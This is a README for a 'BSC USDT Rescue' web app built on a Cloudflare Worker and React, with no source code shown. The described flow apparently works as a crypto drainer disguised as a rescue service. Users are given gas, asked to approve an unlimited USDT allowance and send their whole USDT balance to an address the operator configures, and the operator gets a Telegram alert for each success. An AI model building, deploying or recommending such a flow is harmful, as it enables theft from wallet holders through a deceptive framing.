# BSC USDT Rescue

A **complete, Cloudflare‑ready web3 rescue service** for BSC‑only USDT.  Users connect their wallet, get a one‑time BNB gas sponsorship (if needed), and rescue their USDT to a configured destination address.  All sensitive logic (sponsor signing, transaction verification, Telegram notifications) runs in a Cloudflare Worker; the frontend is a lightweight Vite + React app that talks to the Worker via `/api/*` endpoints.

---

## Project Structure
```
 bsc-usdt-rescue/
 ├─ src/
 │   ├─ client/                # Vite React frontend
 │   │   ├─ index.html
 │   │   ├─ main.tsx
 │   │   ├─ App.tsx
 │   │   ├─ components/
 │   │   │   ├─ Header.tsx      # Service header + dark/light toggle
 │   │   │   └─ RescueCard.tsx  # UI for wallet status, sponsorship, rescue
 │   │   ├─ wallet/
 │   │   │   └─ wallet.ts       # viem/EIP‑1193 helpers (connect, switch, balance, approve, transfer)
 │   │   ├─ api/
 │   │   │   └─ client.ts       # Tiny fetch wrapper for GET/POST JSON
 │   │   ├─ config/
 │   │   │   └─ publicConfig.ts # Public constants (chainId, RPC URL, contract, destination)
 │   │   └─ styles/
 │   │       └─ index.css       # Tailwind entry
 │   └─ worker/                # Cloudflare Worker backend
 │       ├─ index.ts            # Router for /api/*
 │       ├─ sponsor.ts          # One‑time BNB sponsorship flow
 │       ├─ rescue.ts           # Rescue transaction verification
 │       ├─ telegram.ts         # Telegram Bot API helper
 │       ├─ db.ts               # D1 (SQLite) wrapper
 │       └─ config.ts           # Server‑side env vars (secrets & public values)
 ├─ db/
 │   └─ migrations/
 │       └─ 20240923_create_sponsorships.sql  # D1 schema
 ├─ tests/
 │   ├─ sponsor.test.ts       # Unit tests for DB helpers / race‑condition guard
 │   └─ rescue.test.ts        # Unit tests for transaction verification logic
 ├─ .env.example               # List of required env vars (no values)
 ├─ package.json
 ├─ tsconfig.json
 ├─ vite.config.ts
 ├─ tailwind.config.cjs
 ├─ wrangler.toml              # Cloudflare Worker config + D1 binding
 └─ README.md                  # (this file)
```

---

## Configuration
### Public (frontend) – set in **`.env.example`** and later copied to your Vite environment
| Variable | Description |
|----------|-------------|
| `VITE_BSC_RPC_URL` | Public BSC RPC endpoint (e.g. https://bsc-dataseed.binance.org). |
| `VITE_BSC_USDT_CONTRACT_ADDRESS` | USDT contract address on BSC. |
| `VITE_RESCUE_DESTINATION_ADDRESS` | Destination wallet that will receive rescued USDT. |

### Secret (worker) – stored as **Cloudflare Secrets** (`wrangler secret put …`)
| Variable | Description |
|----------|-------------|
| `BSC_RPC_URL` | Same RPC URL used by the worker (can be a private endpoint). |
| `SPONSOR_WALLET_PRIVATE_KEY` | Private key of the gas‑sponsor wallet. |
| `SPONSOR_BNB_AMOUNT` | Decimal BNB amount to sponsor (e.g. `0.01`). Converted to wei at runtime. |
| `TELEGRAM_BOT_TOKEN` | Bot token for notifications. |
| `TELEGRAM_CHAT_ID` | Chat ID where messages are sent. |
| `BSC_USDT_CONTRACT_ADDRESS` | Same address as the public one – kept secret for verification. |
| `RESCUE_DESTINATION_ADDRESS` | Destination address – secret for the worker verification. |
| `REQUIRED_CONFIRMATIONS` | Number of BSC confirmations required (default `1`). |

---

## How the Flow Works
1. **Connect Wallet** – Frontend calls `connectWallet()` (EIP‑1193). The address is stored and displayed.
2. **Sponsorship Check** – Frontend GET `/api/check-sponsor?addr=0x…`. Worker looks up the D1 table.
3. **Sponsorship Request** – If no record, frontend POST `/api/sponsor` with the address. Worker:
   - Inserts a `PENDING` row (unique index prevents races).
   - Signs and sends a BNB transaction using the sponsor private key.
   - Waits for the configured number of confirmations.
   - Updates the row to `CONFIRMED` (or `FAILED`).
   - Sends a Telegram message with status, wallet, tx hash, network, timestamp.
4. **Rescue USDT** – Frontend:
   - Ensures the wallet is on BSC (`ensureBSC`).
   - Calls `approveUnlimited()` on the USDT contract (unlimited allowance).
   - Calls `transferUSDT()` to move the full USDT balance to the destination address.
   - Receives the transaction hash and POSTs it to `/api/verify-rescue`.
5. **Backend Verification** – Worker fetches the receipt directly from the BSC RPC, validates:
   - Chain ID is 56.
   - Transaction succeeded and has enough confirmations.
   - `to` address equals the USDT contract.
   - A `Transfer` event with the expected **from → destination** and **amount** exists.
   - On success, sends a clean Telegram message (status, wallet, hash, network, timestamp).
6. **Frontend UI** – Shows success/failure, transaction hash (link to BscScan), and current sponsorship status.

---

## Local Development
```bash
# 1. Install deps
npm install

# 2. Copy env example and fill in public values only
cp .env.example .env
#   -> edit .env with your public RPC URL, USDT contract, destination address

# 3. Run the Vite frontend
npm run dev
#    Open http://localhost:3000

# 4. Run the Worker locally (requires Wrangler)
wrangler dev
#    The frontend will call http://localhost:8787/api/*
```
No secrets are required for local dev – the worker will error if missing env vars, which is expected.

---

## Deployment to Cloudflare
1. **Create a D1 database** in the Cloudflare dashboard and note its ID.
2. **Add the binding** in `wrangler.toml` (replace `<YOUR_D1_DATABASE_ID>`).
3. **Add secrets** (run from the project root):
```bash
wrangler secret put SPONSOR_WALLET_PRIVATE_KEY
wrangler secret put BSC_RPC_URL
wrangler secret put SPONSOR_BNB_AMOUNT   # e.g. "0.01"
wrangler secret put TELEGRAM_BOT_TOKEN
wrangler secret put TELEGRAM_CHAT_ID
wrangler secret put BSC_USDT_CONTRACT_ADDRESS
wrangler secret put RESCUE_DESTINATION_ADDRESS
wrangler secret put REQUIRED_CONFIRMATIONS   # optional, defaults to 1
```
4. **Run the migration** (creates the `sponsorships` table):
```bash
npm run migrate
```
5. **Build the Worker** and **publish**:
```bash
npm run build:worker   # compiles TS to dist/worker
wrangler publish
```
6. **Deploy the frontend** via Cloudflare Pages (point it to the `dist` folder created by `npm run build`).
   - Ensure the Pages project is set to **Serve as a static site** and that the **/api/** path points to the Worker (you can use a custom domain with a route like `example.com/api/*` → Worker).

---

## Testing
```bash
npm test                # runs vitest on both frontend & worker unit tests
```
Key test coverage:
- **Sponsorship DB** – ensures the unique constraint prevents duplicate sponsor transactions.
- **Rescue verification** – validates success path, wrong chain, wrong contract, mismatched destination, and failed tx.
- **Security checks** – a build‑time script can grep the production bundle for secret variable names (already covered in CI‑less manual check).

---

## Security Notes
- **Never** store `SPONSOR_WALLET_PRIVATE_KEY`, `TELEGRAM_BOT_TOKEN`, `BSC_RPC_URL` (private) or any DB credentials in the frontend bundle.  They are only read from `process.env` inside the Worker.
- The worker **verifies** every rescue transaction on‑chain; it does *not* trust any data sent from the browser.
- The D1 table has a **unique index** on `wallet_address + network` to guarantee a single sponsorship per wallet.
- All logs (`console.log`) are limited to non‑secret data (address, tx hash, status).

---

## Extending the Project
- **Add more UI states** (e.g., loading spinners) – just extend `RescueCard`.
- **Change the token** – update the contract address in the env vars; the code is token‑agnostic.
- **Add more networks** – adapt `ensureBSC` and the Worker verification chain ID.
- **Integrate analytics** – push events from the frontend to any analytics service without touching the backend.

---

## License
MIT – feel free to fork, modify, and deploy.
